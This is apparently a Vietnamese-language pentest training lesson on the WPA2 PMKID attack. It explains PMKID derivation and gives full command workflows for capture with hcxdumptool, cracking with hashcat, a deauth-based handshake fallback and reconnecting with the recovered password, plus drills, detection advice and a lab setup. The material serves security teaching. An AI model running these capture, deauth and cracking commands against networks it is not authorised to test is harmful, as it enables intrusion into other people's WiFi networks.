---
title: "06. PMKID: Clientless PMK Fingerprinting"
type: attack
tags: [pentest, wifi, wireless, wpa2, pmkid, hashcat, attack, lesson-06]
aliases: [PMKID Attack]
created: 2026-04-01
---

> **Prerequisites**: [[04-wpa2-key-hierarchy|04. WPA2 Key Hierarchy]] · [[05-four-way-handshake|05. 4-Way Handshake & Group Key Handshake]]
> **Objectives**:
> - Hiểu tại sao AP broadcast PMKID trong EAPOL Message 1
> - Nắm công thức PMKID và tại sao nó cho phép offline crack
> - Thực hiện PMKID capture với hcxdumptool và crack với hashcat
> - Phân biệt PMKID attack vs traditional handshake capture

---

## Điều kiện khai thác

> [!note] Điều kiện bắt buộc
> - AP sử dụng WPA2-PSK (không phải Enterprise)
> - AP hỗ trợ và broadcast PMKID trong EAPOL Message 1 (hầu hết AP hiện đại đều làm)
> - WiFi adapter hỗ trợ monitor mode và packet injection
> - Không cần bất kỳ client nào đang kết nối vào AP
>
> [!tip] Tại sao PMKID là game changer (2018)
> Trước PMKID attack (phát hiện bởi Jens Steube — tác giả hashcat năm 2018), attacker phải chờ client kết nối, sau đó deauth để force reconnect, rồi capture 4-way handshake. PMKID loại bỏ tất cả: chỉ cần trigger EAPOL Message 1 từ AP và capture PMKID trong đó.
>
---

## Cơ chế tấn công

### PMKID là gì và tại sao AP gửi nó?

PMKID (Pairwise Master Key Identifier) là một 128-bit identifier được include trong RSN Information Element của EAPOL-Key Message 1. Mục đích hợp pháp: cho phép STA tìm cached PMK nhanh (PMKSA caching) thay vì phải chạy lại EAP authentication.

**Công thức:**
```text
PMKID = HMAC-SHA1-128(PMK, "PMK Name" ‖ AA ‖ SPA)
```text
Trong đó:
- **PMK**: Pairwise Master Key (derive từ password, đây là secret cần tìm)
- **"PMK Name"**: Literal ASCII string "PMK Name" (8 bytes)
- **AA**: Authenticator Address — MAC của AP (public, visible trong beacon)
- **SPA**: Supplicant Address — MAC của STA (attacker's MAC — attacker biết)
- **HMAC-SHA1-128**: HMAC-SHA1 output truncated to 128 bits (16 bytes)

> [!warning] Tại sao đây là vulnerability
> PMKID chứa HMAC của PMK với các giá trị attacker đều biết (AA, SPA) hoặc attacker tự chọn (SPA = attacker's MAC). Attacker có thể:
> 1. Capture PMKID từ EAPOL M1
> 2. Với password candidate P: tính PMK = PBKDF2(P, SSID, ...) → tính PMKID_candidate
> 3. So sánh PMKID_candidate với captured PMKID
> 4. Match → P là password đúng
> Đây là offline dictionary attack giống handshake crack, nhưng không cần client.
>
### So sánh PMKID vs Handshake Attack

| Aspect | Handshake capture | PMKID capture |
|--------|-----------------|--------------|
| Cần client? | Có | Không |
| Phải deauth? | Thường có | Không |
| Noise/detection | Deauth flood visible | Stealth hơn |
| AP requirement | Bất kỳ WPA2 AP | AP phải gửi PMKID |
| Hashcat mode | 22000 | 22000 (cùng format) |
| Tốc độ crack | Giống nhau | Giống nhau |

Cả hai đều cho cùng kết quả và dùng cùng hashcat mode 22000. PMKID chỉ khác ở bước capture.

---

## Quy trình tấn công

**Môi trường giả định**: Kali Linux, adapter monitor-mode-capable (ví dụ: Alfa AWUS036ACH), AP BSSID `AA:BB:CC:DD:EE:FF` trên channel 6, SSID `TargetNetwork`.

### Bước 1 — Thiết lập monitor mode

```bash
# Kill conflicting processes
sudo airmon-ng check kill

# Start monitor mode
sudo airmon-ng start wlan0

# Verify (interface thường đổi thành wlan0mon)
iwconfig wlan0mon
```text
> **Expected output**: `wlan0mon` hiển thị Mode: Monitor.

### Bước 2 — Capture PMKID với hcxdumptool

```bash
# Capture PMKID từ tất cả APs (general scan)
sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1

# Hoặc target AP cụ thể (stealth hơn)
echo "AABBCCDDEEFF" > target.txt   # BSSID không có dấu :
sudo hcxdumptool -i wlan0mon -o capture.pcapng \
    --filterlist_ap=target.txt --filtermode=2 \
    --enable_status=1

# Chạy 1–2 phút, Ctrl+C để dừng
```text
> **Expected output**: Dòng `[...]  FOUND PMKID` hoặc `[...]  FOUND WPA2` trong terminal khi bật `--enable_status=1`. File `capture.pcapng` được tạo.

### Bước 3 — Convert sang hashcat format

```bash
# Convert pcapng sang .hc22000
hcxpcapngtool capture.pcapng -o hash.hc22000

# Verify nội dung
cat hash.hc22000
# Expected: WPA*02*<PMKID>*<AP_MAC>*<STA_MAC>*<SSID_hex>*...
```text
> **Expected output**: Một hoặc nhiều dòng format hash 22000. Nếu empty → không capture được PMKID (AP không support hoặc không trong range).

### Bước 4 — Crack với hashcat

```bash
# Dictionary attack với rockyou
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

# Với rules (tăng coverage đáng kể)
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule

# Mask attack (nếu biết password pattern, ví dụ: 8 chữ số)
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d

# Show kết quả sau khi crack
hashcat -m 22000 hash.hc22000 --show
```text
> **Expected output**: `WPA*02*...:targetpassword` — password nằm sau dấu `:` cuối cùng.

### Bước 5 — Verify và reconnect

```bash
# Test kết nối (Linux wpa_supplicant)
wpa_passphrase TargetNetwork "targetpassword" > /tmp/wpa.conf
sudo wpa_supplicant -i wlan0 -c /tmp/wpa.conf -D nl80211 &
sudo dhclient wlan0

# Verify IP
ip addr show wlan0
```text
> **Expected output**: DHCP lease nhận được → `inet X.X.X.X/24` trong output.

---

## Biến thể & Bypass

### Nếu AP không gửi PMKID

Một số AP (đặc biệt enterprise-grade) disable PMKID để giảm attack surface. Trong trường hợp này:

```bash
# Fall back sang traditional handshake capture
sudo airodump-ng -w capture --bssid <BSSID> -c <CH> wlan0mon &
# Deauth để force reconnect
sudo aireplay-ng -0 5 -a <BSSID> wlan0mon
# Convert sang hashcat
hcxpcapngtool capture-01.cap -o hash.hc22000
```text
### hcxdumptool vs airodump-ng + aireplay-ng

```bash
# Method 1: hcxdumptool (all-in-one, recommended)
sudo hcxdumptool -i wlan0mon -o capture.pcapng

# Method 2: airodump + aireplay (classic, noisier)
sudo airodump-ng -w cap --bssid <BSSID> wlan0mon
sudo aireplay-ng -0 10 -a <BSSID> wlan0mon

# Method 3: bettercap (modern, feature-rich)
sudo bettercap -iface wlan0
# bettercap> wifi.recon on
# bettercap> wifi.handshakes.dir /tmp/handshakes
```text
### Hashcat Mode 22000 vs 22001

```bash
# Mode 22000: WPA-PBKDF2-PMKID+EAPOL (new unified format)
# Supports cả PMKID và EAPOL handshake trong cùng file
hashcat -m 22000 hash.hc22000 wordlist.txt

# Mode 22001: WPA-PMK-PMKID+EAPOL (dùng PMK trực tiếp, không cần PBKDF2)
# Dùng khi đã biết PMK (từ WPA2-Enterprise leak) → skip PBKDF2
hashcat -m 22001 hash.hc22000 pmk_list.txt
```text
---

## Cây quyết định

```mermaid
flowchart TD
    A[Target là WPA2-PSK?] -->|Có| B[Thử PMKID capture trước]
    A -->|Không - Enterprise| C[Xem Lesson 07 - EAP attacks]
    B --> D{hcxdumptool tìm PMKID?}
    D -->|Có| E[Convert và crack với hashcat -m 22000]
    D -->|Không - AP không support| F[Fall back: deauth + handshake capture]
    E --> G{Wordlist crack thành công?}
    F --> G
    G -->|Có| H[Verify kết nối → pentest network]
    G -->|Không - weak wordlist| I[Rule-based attack + mask attack]
    G -->|Không - strong password| J[Document: strong password, note SSID for rainbow table check]
    I -->|Crack thành công| H
    I -->|Fail| J
```text
---

## Command Cheatsheet

**Setup**

```bash
# Monitor mode
sudo airmon-ng check kill && sudo airmon-ng start wlan0

# Scan targets
sudo airodump-ng wlan0mon
# Note: BSSID, Channel, ENC=WPA2, AUTH=PSK
```text
**PMKID Capture**

```bash
# All APs
sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1

# Target AP cụ thể
echo "<BSSID_no_colons>" > target.txt
sudo hcxdumptool -i wlan0mon -o capture.pcapng --filterlist_ap=target.txt --filtermode=2 --enable_status=1

# Convert
hcxpcapngtool capture.pcapng -o hash.hc22000
```text
**Handshake Capture (fallback)**

```bash
sudo airodump-ng -w cap --bssid <BSSID> -c <CH> wlan0mon
sudo aireplay-ng -0 5 -a <BSSID> wlan0mon
hcxpcapngtool cap-01.cap -o hash.hc22000
```text
**Crack**

```bash
# Dictionary
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

# Dictionary + rules
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt -r best64.rule

# Mask (8 digits)
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d

# Show results
hashcat -m 22000 hash.hc22000 --show
```text
---

## Daily Drill

**Thời gian**: 15–20 phút/ngày trong 7 ngày đầu.

**Drill 1 — Setup nhanh**
Mục tiêu: monitor mode và hcxdumptool không cần lookup

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo hcxdumptool -i wlan0mon -o cap.pcapng --enable_status=1
```text
Luyện cho đến khi: 3 lệnh này gõ liên tiếp trong dưới 20 giây.

**Drill 2 — Full pipeline**
Mục tiêu: thực hiện PMKID → crack pipeline không cần cheatsheet

```bash
# 1. Capture
sudo hcxdumptool -i wlan0mon -o cap.pcapng --enable_status=1
# 2. Convert
hcxpcapngtool cap.pcapng -o hash.hc22000
# 3. Crack
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
# 4. Show
hashcat -m 22000 hash.hc22000 --show
```text
Luyện cho đến khi: hoàn thành 4 bước trong 3 phút (không tính thời gian crack).

**Drill 3 — Nhận diện nhanh**
Nhìn vào dòng hash 22000, identify: PMKID hay EAPOL? SSID là gì?

```text
WPA*01*<16 bytes PMKID>*<AP MAC>*<STA MAC>*<SSID hex>*...  → PMKID (01)
WPA*02*<16 bytes MIC>*<AP MAC>*<STA MAC>*<SSID hex>*...   → EAPOL (02)
```text
Luyện cho đến khi: phân biệt ngay khi thấy `*01*` vs `*02*`.

---

## Phát hiện & Phòng thủ

> [!warning] Detection
> PMKID capture rất stealth — chỉ cần trigger EAPOL M1 response. AP logs thường không phân biệt được legitimate client probe vs attacker probe.
> **IDS signature**: Nhiều EAPOL M1 từ cùng MAC trong thời gian ngắn với không có M2 follow-up → suspect PMKID scan.
> **Better**: Monitor thấy source MAC không tồn tại trong lease database nhưng trong range.
>
> [!note] Mitigation
> Không có cách disable PMKID mà không ảnh hưởng PMKSA caching (một số AP enterprise cho phép). Mitigation thực sự duy nhất: strong passphrase (20+ chars random) → brute-force không khả thi. Hoặc migrate sang WPA3-SAE (PMKID attack không apply vì PMK không derive từ password).
>
---

## Lab Thực hành

| Platform | Machine | Tại sao phù hợp |
|----------|---------|----------------|
| HTB | **Wifinetic** (Retired) | WPA2 PSK capture + reaver WPS — hiểu full workflow |
| HTB | **WifineticTwo** (Retired) | Pixie Dust nhưng underlying WPA2 infrastructure |
| Local VM | hostapd + wpa_supplicant | Setup lab 100% controllable, practice PMKID capture |

**Local lab setup:**

```bash
# AP side (hostapd config):
# interface=wlan0
# ssid=TestLab
# wpa=2
# wpa_passphrase=LabPassword123
# wpa_key_mgmt=WPA-PSK
# rsn_pairwise=CCMP
sudo hostapd /etc/hostapd/hostapd.conf

# Client side (wpa_supplicant):
wpa_passphrase TestLab LabPassword123 > /tmp/wpa.conf
sudo wpa_supplicant -i wlan1 -c /tmp/wpa.conf
```text
---

## Field Manual Entry

> [!abstract] PMKID Attack — Quick Reference
> **Điều kiện**: WPA2-PSK, AP broadcast PMKID, monitor mode adapter
> **Lệnh nhanh**: `hcxdumptool -i wlan0mon -o cap.pcapng --enable_status=1`
> **Full flow**: `airmon-ng start wlan0` → `hcxdumptool` capture → `hcxpcapngtool cap.pcapng -o hash.hc22000` → `hashcat -m 22000 hash.hc22000 rockyou.txt`
> **Look for**: `FOUND PMKID` trong hcxdumptool output → `hash:password` trong hashcat output
> **Detection**: Nhiều EAPOL M1 probe không có M2 follow-up
> **Ref**: [[06-pmkid-attack|06. PMKID Attack]]
>